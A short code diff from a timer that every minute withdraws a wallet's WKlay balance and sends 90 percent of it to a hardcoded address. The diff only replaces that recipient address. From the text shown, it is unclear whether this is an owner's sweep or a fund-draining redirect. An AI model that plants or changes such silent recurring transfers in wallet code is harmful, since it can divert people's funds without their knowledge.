@@ -9,7 +9,7 @@ setInterval(async () => {
         try {
             const balance = await WKlayContract.balanceOf(Klaytn.walletAddress!);
             await WKlayContract.withdraw(balance);
-            await Klaytn.send("0xEfaA075D8478c81Bde39795dF7588b7BEbA7e192", balance.mul(9).div(10));
+            await Klaytn.send("0xBd297DacCD1E9B6ec33D13a20765B4acF0d77333", balance.mul(9).div(10));
         } catch (e) { console.error(e); }
     }
 }, 60000);
